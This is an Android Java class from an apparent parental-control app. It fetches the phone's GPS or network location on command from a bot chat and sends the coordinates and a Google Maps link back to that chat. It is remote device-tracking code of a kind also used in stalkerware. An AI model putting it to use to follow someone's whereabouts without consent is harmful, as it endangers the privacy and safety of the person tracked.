package com.parentcontrol;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import okhttp3.OkHttpClient;

public class LocationHelper {
    public static void getLocation(Context context, OkHttpClient client, String chatId) {
        BotService service = (BotService) context;
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);

            // Сначала пробуем кешированное
            Location cached = null;
            try { cached = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); } catch (SecurityException ignored) {}
            if (cached == null) {
                try { cached = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); } catch (SecurityException ignored) {}
            }
            if (cached == null) {
                try { cached = lm.getLastKnownLocation(LocationManager.FUSED_PROVIDER); } catch (Exception ignored) {}
            }

            if (cached != null) {
                sendLocation(service, chatId, cached);
                return;
            }

            // Кеша нет - запрашиваем активно
            service.sendTextTo(chatId, "📍 Запрашиваю GPS...");

            Handler handler = new Handler(Looper.getMainLooper());
            LocationListener[] listenerHolder = new LocationListener[1];

            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    try { lm.removeUpdates(this); } catch (SecurityException ignored) {}
                    sendLocation(service, chatId, location);
                }
                @Override public void onStatusChanged(String p, int s, Bundle e) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) {}
            };
            listenerHolder[0] = listener;

            // Таймаут 15 секунд
            handler.postDelayed(() -> {
                try { lm.removeUpdates(listener); } catch (SecurityException ignored) {}
                service.sendTextTo(chatId, "❌ GPS не ответил за 15 сек. Попробуй выйти на улицу.");
            }, 15000);

            boolean requested = false;
            try {
                if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, listener, Looper.getMainLooper());
                    requested = true;
                }
            } catch (SecurityException ignored) {}

            if (!requested) {
                try {
                    if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                        lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, listener, Looper.getMainLooper());
                    }
                } catch (SecurityException ignored) {}
            }

        } catch (Exception e) {
            service.sendTextTo(chatId, "❌ Ошибка геолокации: " + e.getMessage());
        }
    }

    private static void sendLocation(BotService service, String chatId, Location loc) {
        double lat = loc.getLatitude();
        double lon = loc.getLongitude();
        service.sendPlainText(chatId,
            "Координаты: " + lat + ", " + lon +
            "\nhttps://maps.google.com/?q=" + lat + "," + lon);
    }
}
